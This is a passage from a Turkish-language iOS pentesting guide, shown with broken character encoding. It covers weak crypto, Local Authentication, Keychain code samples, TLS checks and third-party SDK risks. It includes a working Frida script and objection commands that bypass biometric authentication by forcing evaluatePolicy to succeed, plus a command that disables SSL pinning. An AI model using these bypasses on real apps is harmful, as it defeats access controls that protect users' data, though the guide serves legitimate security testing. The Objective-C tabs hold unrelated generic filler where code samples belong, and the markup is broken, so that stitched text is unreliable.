GeliÅŸtiriciler **kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸ algoritmalarÄ±** kullanmamalÄ±dÄ±r **yetkilendirme kontrolÃ¼**, **veri depolama** veya **gÃ¶nderme** iÅŸlemleri iÃ§in. Bu algoritmalarÄ±n bazÄ±larÄ±: RC4, MD4, MD5, SHA1... Ã–rneÄŸin ÅŸifreleri depolamak iÃ§in **hash** kullanÄ±lÄ±yorsa, hashlerin tuz ile birlikte kullanÄ±ldÄ±ÄŸÄ± kaba kuvvet saldÄ±rÄ±larÄ±na dayanÄ±klÄ± olmalÄ±dÄ±r.

### Kontrol

YapÄ±lmasÄ± gereken ana kontroller, kod iÃ§inde **sabitlenmiÅŸ** ÅŸifreler/sÄ±rlar bulunup bulunmadÄ±ÄŸÄ±nÄ±, bunlarÄ±n **tahmin edilebilir** olup olmadÄ±ÄŸÄ±nÄ± ve kodun bazÄ± tÃ¼rde **zayÄ±f** **ÅŸifreleme** algoritmalarÄ±nÄ± kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± bulmaktÄ±r.

Ä°lginÃ§ olan ÅŸudur ki, **objection** kullanarak bazÄ± **ÅŸifreleme** **kÃ¼tÃ¼phanelerini** otomatik olarak **izleyebilirsiniz**.
```swift
ios monitor crypt
```
iOS ÅŸifreleme API'larÄ± ve kÃ¼tÃ¼phaneleri hakkÄ±nda **daha fazla bilgi** iÃ§in [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Yerel Kimlik DoÄŸrulama

**Yerel kimlik doÄŸrulama**, Ã¶zellikle uzaktaki bir uÃ§ noktaya ÅŸifreleme yÃ¶ntemleri aracÄ±lÄ±ÄŸÄ±yla eriÅŸimi koruma konusunda Ã¶nemli bir rol oynar. Buradaki esas nokta, uygun ÅŸekilde uygulanmadÄ±ÄŸÄ±nda yerel kimlik doÄŸrulama mekanizmalarÄ±nÄ±n atlatÄ±labilir olabileceÄŸidir.

Apple'Ä±n [**Yerel Kimlik DoÄŸrulama Ã§erÃ§evesi**](https://developer.apple.com/documentation/localauthentication) ve [**anahtarlÄ±k**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html), geliÅŸtiricilere kullanÄ±cÄ± kimlik doÄŸrulama iletiÅŸim kutularÄ±nÄ± kolaylaÅŸtÄ±rmak ve sÄ±rlÄ± verileri gÃ¼venli bir ÅŸekilde iÅŸlemek iÃ§in saÄŸlam API'lar saÄŸlar. GÃ¼venli Kasa, Parmak Ä°zi KimliÄŸi iÃ§in parmak izi kimliÄŸini gÃ¼vence altÄ±na alÄ±rken, YÃ¼z KimliÄŸi biyometrik verileri tehlikeye atmadan yÃ¼z tanÄ±ma Ã¼zerine kuruludur.

Touch ID/Face ID'yi entegre etmek iÃ§in geliÅŸtiricilerin iki API seÃ§eneÄŸi vardÄ±r:

* YÃ¼ksek seviyeli kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in **`LocalAuthentication.framework`**.
* DÃ¼ÅŸÃ¼k seviyeli anahtarlÄ±k hizmetlerine eriÅŸim iÃ§in **`Security.framework`**, biyometrik kimlik doÄŸrulamasÄ± ile sÄ±rlÄ± verileri gÃ¼vence altÄ±na alÄ±r. Ã‡eÅŸitli [aÃ§Ä±k kaynaklÄ± sarmallar](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) anahtarlÄ±k eriÅŸimini daha basit hale getirir.

{% hint style="danger" %}
Ancak, hem `LocalAuthentication.framework` hem de `Security.framework`, genellikle kimlik doÄŸrulama sÃ¼reÃ§leri iÃ§in veri iletimi yapmadan Ã¶ncelikle boolean deÄŸerler dÃ¶ndÃ¼rdÃ¼kleri iÃ§in gÃ¼venlik aÃ§Ä±klarÄ± sunarlar, bu da onlarÄ± atlanabilir hale getirir (bkz. [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Yerel Kimlik DoÄŸrulamasÄ± Uygulamak

KullanÄ±cÄ±larÄ± kimlik doÄŸrulamasÄ± iÃ§in yÃ¶nlendirmek iÃ§in geliÅŸtiricilerin **`LAContext`** sÄ±nÄ±fÄ± iÃ§indeki **`evaluatePolicy`** yÃ¶ntemini kullanmalarÄ± gerekmektedir, aÅŸaÄŸÄ±dakiler arasÄ±ndan seÃ§im yaparak:

* **`deviceOwnerAuthentication`**: Touch ID veya cihaz ÅŸifresi istemek, ikisi de etkin deÄŸilse baÅŸarÄ±sÄ±z olur.
* **`deviceOwnerAuthenticationWithBiometrics`**: YalnÄ±zca Touch ID istemek.

BaÅŸarÄ±lÄ± bir kimlik doÄŸrulama, **`evaluatePolicy`** yÃ¶nteminden gelen boolean bir deÄŸerle gÃ¶sterilir, potansiyel bir gÃ¼venlik aÃ§Ä±ÄŸÄ±na iÅŸaret eder.

### AnahtarlÄ±k Kullanarak Yerel Kimlik DoÄŸrulamasÄ±

iOS uygulamalarÄ±nda **yerel kimlik doÄŸrulamasÄ±** uygulamak, kimlik doÄŸrulama belgeleri gibi sÄ±rlÄ± verileri gÃ¼venli bir ÅŸekilde saklamak iÃ§in **anahtarlÄ±k API'larÄ±** kullanÄ±mÄ±nÄ± iÃ§erir. Bu sÃ¼reÃ§, verinin yalnÄ±zca kullanÄ±cÄ± tarafÄ±ndan, cihaz ÅŸifresi veya Touch ID gibi biyometrik kimlik doÄŸrulama kullanÄ±larak eriÅŸilebileceÄŸini saÄŸlar.

AnahtarlÄ±k, `SecAccessControl` Ã¶zelliÄŸi ile Ã¶ÄŸeleri ayarlamayÄ± saÄŸlar, bu da kullanÄ±cÄ±nÄ±n Touch ID veya cihaz ÅŸifresi ile baÅŸarÄ±lÄ± bir ÅŸekilde kimlik doÄŸrulamasÄ±nÄ± yapana kadar Ã¶ÄŸeye eriÅŸimi kÄ±sÄ±tlar. Bu Ã¶zellik gÃ¼venliÄŸi artÄ±rmak iÃ§in Ã¶nemlidir.

AÅŸaÄŸÄ±da, Swift ve Objective-C'de bir dizeyi anahtarlÄ±ÄŸa kaydetme ve geri almayÄ± gÃ¶steren kod Ã¶rnekleri bulunmaktadÄ±r, bu gÃ¼venlik Ã¶zelliklerini kullanarak eriÅŸim kontrolÃ¼nÃ¼ ayarlamayÄ± ve verinin yalnÄ±zca ayarlandÄ±ÄŸÄ± cihazda, bir cihaz ÅŸifresinin yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ± koÅŸul altÄ±nda eriÅŸilebilir olmasÄ±nÄ± saÄŸlamayÄ± Ã¶zellikle gÃ¶stermektedir.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}

### iOS Uygulama Pentesting

Bu bÃ¶lÃ¼mde, iOS uygulamalarÄ±nÄ± pentest etmek iÃ§in kullanÄ±labilecek bazÄ± temel teknikler ve araÃ§lar hakkÄ±nda bilgi bulabilirsiniz.

#### AraÃ§lar

- **MobSF**: Otomatik olarak iOS uygulamalarÄ±nÄ± analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir mobil gÃ¼venlik Ã§erÃ§evesi.
- **Needle**: iOS uygulamalarÄ±nÄ± test etmek iÃ§in kullanÄ±lan bir framework.
- **Cycript**: iOS uygulamalarÄ±nÄ± canlÄ± olarak analiz etmek iÃ§in kullanÄ±lan bir araÃ§.
- **Clutch**: iOS uygulamalarÄ±nÄ± kÄ±rÄ±p Ã§Ä±karmak iÃ§in kullanÄ±lan bir araÃ§.
- **Frida**: Dinamik olarak iOS uygulamalarÄ±nÄ± manipÃ¼le etmek iÃ§in kullanÄ±lan bir araÃ§.

#### Temel Teknikler

- **Tersine MÃ¼hendislik**: UygulamanÄ±n Ã§alÄ±ÅŸma mantÄ±ÄŸÄ±nÄ± anlamak iÃ§in kullanÄ±lÄ±r.
- **Veri Depolama Analizi**: UygulamanÄ±n yerel olarak depoladÄ±ÄŸÄ± hassas verileri bulmak iÃ§in kullanÄ±lÄ±r.
- **AÄŸ Trafik Analizi**: UygulamanÄ±n aÄŸ trafiÄŸini izleyerek hassas verilerin nasÄ±l iletilip alÄ±ndÄ±ÄŸÄ±nÄ± anlamak iÃ§in kullanÄ±lÄ±r.
- **GÃ¼venlik Zafiyetleri Analizi**: Uygulamada yaygÄ±n gÃ¼venlik zafiyetlerini araÅŸtÄ±rmak iÃ§in kullanÄ±lÄ±r.

Bu temel teknikler ve araÃ§lar, iOS uygulamalarÄ±nÄ± pentest etmek iÃ§in baÅŸlangÄ±Ã§ noktanÄ±z olabilir. Daha fazla bilgi edinmek ve becerilerinizi geliÅŸtirmek iÃ§in pratik yapmayÄ± unutmayÄ±n!

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

ArtÄ±k anahtarlÄ±kta kaydedilen Ã¶ÄŸeyi isteyebiliriz. AnahtarlÄ±k hizmetleri, kullanÄ±cÄ±ya kimlik doÄŸrulama iletiÅŸim kutusunu sunacak ve uygun bir parmak izi saÄŸlanÄ±p saÄŸlanmadÄ±ÄŸÄ±na baÄŸlÄ± olarak veri veya nil dÃ¶ndÃ¼recektir.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}

## Objective-C

Objective-C is the primary programming language used for iOS app development. When performing iOS pentesting, it is essential to understand Objective-C code to identify security vulnerabilities effectively.

### Tools for Analyzing Objective-C Code

There are several tools available for analyzing Objective-C code during iOS pentesting:

1. **Hopper Disassembler**: A reverse engineering tool that can be used to disassemble, decompile, and debug applications.

2. **class-dump**: A command-line utility that generates Objective-C headers from Mach-O files.

3. **otool**: A command-line tool for examining the contents of Mach-O files.

4. **IDA Pro**: A powerful disassembler and debugger that supports Objective-C.

### Common Vulnerabilities in Objective-C Code

Some common security vulnerabilities found in Objective-C code include:

- **Insecure Data Storage**: Storing sensitive data in an insecure manner.
- **Input Validation Issues**: Failing to properly validate user input.
- **Insecure Communication**: Transmitting data over insecure channels.
- **Memory Management Errors**: Improper handling of memory can lead to vulnerabilities like buffer overflows.

By using the mentioned tools and understanding common vulnerabilities, security professionals can effectively identify and mitigate security risks in Objective-C code during iOS pentesting.

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### Tespit

Uygulamadaki Ã§erÃ§evelerin kullanÄ±mÄ±, uygulama ikili dosyasÄ±nÄ±n paylaÅŸÄ±lan dinamik kÃ¼tÃ¼phaneler listesini analiz edilerek de tespit edilebilir. Bunun iÃ§in `otool` kullanÄ±labilir:
```bash
$ otool -L <AppName>.app/<AppName>
```
EÄŸer bir uygulamada `LocalAuthentication.framework` kullanÄ±lÄ±yorsa, Ã§Ä±ktÄ± hem aÅŸaÄŸÄ±daki satÄ±rlarÄ± iÃ§erecektir (unutmayÄ±n ki `LocalAuthentication.framework` aslÄ±nda `Security.framework`'Ã¼ kullanÄ±r):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
EÄŸer `Security.framework` kullanÄ±lÄ±yorsa, sadece ikinci olan gÃ¶sterilecektir.

### Yerel Kimlik DoÄŸrulama Ã‡erÃ§evesi Atlatma

#### **Objection**

**Objection Biyometrik Atlatma** aracÄ±lÄ±ÄŸÄ±yla, [bu GitHub sayfasÄ±nda](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) bulunan bir teknik, **LocalAuthentication** mekanizmasÄ±nÄ± aÅŸmak iÃ§in mevcuttur. Bu yaklaÅŸÄ±mÄ±n Ã¶zÃ¼, `evaluatePolicy` fonksiyonunu manipÃ¼le etmek iÃ§in **Frida**'yÄ± kullanmaktÄ±r, bÃ¶ylece gerÃ§ek kimlik doÄŸrulama baÅŸarÄ±sÄ±ndan baÄŸÄ±msÄ±z olarak sÃ¼rekli olarak `True` sonucu vermesini saÄŸlar. Bu, hatalÄ± biyometrik kimlik doÄŸrulama sÃ¼reÃ§lerini atlamak iÃ§in Ã¶zellikle yararlÄ±dÄ±r.

Bu atlatmayÄ± etkinleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Bu komut, Objection'Ä±n bir gÃ¶rev kaydettiÄŸi bir sÄ±ra baÅŸlatÄ±r ve `evaluatePolicy` kontrolÃ¼nÃ¼n sonucunu etkili bir ÅŸekilde `True` olarak deÄŸiÅŸtirir.

#### Frida

[DVIA-v2 uygulamasÄ±](https://github.com/prateek147/DVIA-v2)'ndan **`evaluatePolicy`** kullanÄ±mÄ±na bir Ã¶rnek:
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
**Yerel Kimlik DoÄŸrulamasÄ±**nÄ±n **atlatÄ±lmasÄ±** iÃ§in bir Frida betiÄŸi yazÄ±lÄ±r. Bu betik, **evaluatePolicy** kontrolÃ¼nÃ¼ hedef alarak, geri aramasÄ±nÄ± onaylamak iÃ§in **success=1** deÄŸerini dÃ¶ndÃ¼rmesini saÄŸlar. Geri aramanÄ±n davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirerek, kimlik doÄŸrulama kontrolÃ¼ etkili bir ÅŸekilde atlatÄ±lÄ±r.

AÅŸaÄŸÄ±daki betik, **evaluatePolicy** yÃ¶nteminin sonucunu deÄŸiÅŸtirmek iÃ§in enjekte edilir. Geri aramanÄ±n sonucunu her zaman baÅŸarÄ± olarak gÃ¶sterir.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida betiÄŸi enjekte etmek ve biyometrik kimlik doÄŸrulamasÄ±nÄ± atlamak iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC AracÄ±lÄ±ÄŸÄ±yla Hassas FonksiyonelliÄŸin AÃ§Ä±ÄŸa Ã‡Ä±kmasÄ±

### Ã–zel URI Ä°ÅŸleyicileri / Derin BaÄŸlantÄ±lar / Ã–zel Åemalar

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Evrensel BaÄŸlantÄ±lar

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity PaylaÅŸÄ±mÄ±

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Uygulama UzantÄ±larÄ±

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Web GÃ¶rÃ¼nÃ¼mleri

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### SerileÅŸtirme ve Kodlama

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## AÄŸ Ä°letiÅŸimi

**Åifreleme olmadan** gerÃ§ekleÅŸen iletiÅŸimi kontrol etmek Ã¶nemlidir ve ayrÄ±ca uygulamanÄ±n sunucunun TLS sertifikasÄ±nÄ± doÄŸru bir ÅŸekilde **doÄŸruladÄ±ÄŸÄ±ndan** emin olmak da Ã¶nemlidir.\
Bu tÃ¼r sorunlarÄ± kontrol etmek iÃ§in **Burp** gibi bir proxy kullanabilirsiniz:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ana Bilgisayar AdÄ± KontrolÃ¼

TLS sertifikasÄ±nÄ± doÄŸrularken karÅŸÄ±laÅŸÄ±lan yaygÄ±n bir sorun, sertifikanÄ±n bir **gÃ¼venilir CA** tarafÄ±ndan imzalandÄ±ÄŸÄ±nÄ± kontrol etmek, ancak sertifikanÄ±n **eriÅŸilen ana bilgisayar adÄ±** olup olmadÄ±ÄŸÄ±nÄ± kontrol etmemektir.\
Bu sorunu Burp kullanarak kontrol etmek iÃ§in, iPhone'da Burp CA'ya gÃ¼ven verdikten sonra, Burp ile farklÄ± bir ana bilgisayar adÄ± iÃ§in yeni bir sertifika **oluÅŸturabilir ve kullanabilirsiniz**. Uygulama hala Ã§alÄ±ÅŸÄ±yorsa, bir zafiyet olabilir.

### Sertifika Pinleme

Bir uygulama SSL Pinning'i doÄŸru bir ÅŸekilde kullanÄ±yorsa, uygulama yalnÄ±zca beklenen sertifika olduÄŸunda Ã§alÄ±ÅŸÄ±r. Bir uygulamayÄ± test ederken **bu bir sorun olabilir Ã§Ã¼nkÃ¼ Burp kendi sertifikasÄ±nÄ± sunar.**\
Bu korumayÄ± bir jailbroken cihazda atlamak iÃ§in, uygulamayÄ± [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) veya [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) yÃ¼kleyebilirsiniz.

AyrÄ±ca **objection**'Ä±n `ios sslpinning disable` komutunu kullanabilirsiniz.

## Ã‡eÅŸitli

* **`/System/Library`** dizininde, sistem uygulamalarÄ± tarafÄ±ndan kullanÄ±lan telefon Ã¼zerinde yÃ¼klÃ¼ Ã§erÃ§eveleri bulabilirsiniz.
* KullanÄ±cÄ± tarafÄ±ndan App Store'dan yÃ¼klenen uygulamalar **`/User/Applications`** dizininde bulunur.
* Ve **`/User/Library`** kullanÄ±cÄ± dÃ¼zeyindeki uygulamalar tarafÄ±ndan kaydedilen verileri iÃ§erir.
* Uygulama iÃ§inde kaydedilen notlarÄ± okumak iÃ§in **`/User/Library/Notes/notes.sqlite`**'e eriÅŸebilirsiniz.
* YÃ¼klenmiÅŸ bir uygulamanÄ±n klasÃ¶rÃ¼ iÃ§inde (**`/User/Applications/<APP ID>/`**) bazÄ± ilginÃ§ dosyalar bulabilirsiniz:
  * **`iTunesArtwork`**: Uygulama tarafÄ±ndan kullanÄ±lan simge
  * **`iTunesMetadata.plist`**: App Store'da kullanÄ±lan uygulama bilgileri
  * **`/Library/*`**: Tercihleri ve Ã¶nbelleÄŸi iÃ§erir. **`/Library/Cache/Snapshots/*`** iÃ§inde, uygulamanÄ±n arka plana gÃ¶nderilmeden Ã¶nce yapÄ±lan anlÄ±k gÃ¶rÃ¼ntÃ¼leri bulabilirsiniz.

### SÄ±cak Yama/Zorunlu GÃ¼ncelleme

GeliÅŸtiriciler, uygulamalarÄ±nÄ±n tÃ¼m yÃ¼klemelerini **anÄ±nda uzaktan yamalayabilir** ve uygulamayÄ± App Store'a yeniden gÃ¶nderip onaylanmasÄ±nÄ± beklemek zorunda kalmazlar.\
Bu amaÃ§la genellikle [**JSPatch**](https://github.com/bang590/JSPatch) gibi araÃ§lar kullanÄ±lÄ±r. Ancak [Siren](https://github.com/ArtSabintsev/Siren) ve [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) gibi diÄŸer seÃ§enekler de mevcuttur.\
**Bu, kÃ¶tÃ¼ niyetli Ã¼Ã§Ã¼ncÃ¼ taraf SDK'larÄ± tarafÄ±ndan kÃ¶tÃ¼ye kullanÄ±labilecek tehlikeli bir mekanizmadÄ±r, bu nedenle otomatik gÃ¼ncelleme iÃ§in hangi yÃ¶ntemin kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol etmeniz ve test etmeniz Ã¶nerilir.** Bu amaÃ§la uygulamanÄ±n Ã¶nceki bir sÃ¼rÃ¼mÃ¼nÃ¼ indirmeyi deneyebilirsiniz.

### ÃœÃ§Ã¼ncÃ¼ Taraflar

**3. taraf SDK'larÄ±** ile Ã¶nemli bir zorluk, iÅŸlevsellikleri Ã¼zerinde **ayrÄ±ntÄ±lÄ± kontrol eksikliÄŸidir**. GeliÅŸtiriciler, ya SDK'yÄ± entegre eder ve potansiyel gÃ¼venlik aÃ§Ä±klarÄ± ve gizlilik endiÅŸeleri de dahil olmak Ã¼zere tÃ¼m Ã¶zelliklerini kabul eder ya da tamamen faydalarÄ±ndan vazgeÃ§er. Genellikle, geliÅŸtiriciler bu SDK'larÄ±n iÃ§indeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kendileri yamayamazlar. AyrÄ±ca, SDK'lar topluluk iÃ§inde gÃ¼ven kazandÄ±kÃ§a, bazÄ±larÄ± kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±m iÃ§erebilir.

ÃœÃ§Ã¼ncÃ¼ taraf SDK'larÄ±n saÄŸladÄ±ÄŸÄ± hizmetler arasÄ±nda kullanÄ±cÄ± davranÄ±ÅŸlarÄ±nÄ± izleme, reklam gÃ¶sterimi veya kullanÄ±cÄ± deneyimi iyileÅŸtirmeleri bulunabilir. Ancak, bu, geliÅŸtiricilerin bu kÃ¼tÃ¼phaneler tarafÄ±ndan yÃ¼rÃ¼tÃ¼len kodun tam olarak farkÄ±nda olmamalarÄ±na ve potansiyel gizlilik ve gÃ¼venlik risklerine yol aÃ§abilir. ÃœÃ§Ã¼ncÃ¼ taraf hizmetlerle paylaÅŸÄ±lan bilgilerin sÄ±nÄ±rlÄ± olmasÄ± ve hassas verilerin aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmamasÄ±nÄ±n saÄŸlanmasÄ± Ã¶nemlidir.

UygulamanÄ±n kullandÄ±ÄŸÄ± kÃ¼tÃ¼phaneleri belirlemek iÃ§in **`otool`** komutu kullanÄ±labilir. Bu araÃ§, uygulama ve kullandÄ±ÄŸÄ± her paylaÅŸÄ±lan kÃ¼tÃ¼phane Ã¼zerinde Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r, bÃ¶ylece ek kÃ¼tÃ¼phaneler keÅŸfedilebilir.
```bash
otool -L <application_path>
```
## **Referanslar ve Daha Fazla Kaynak**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobil Uygulama Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
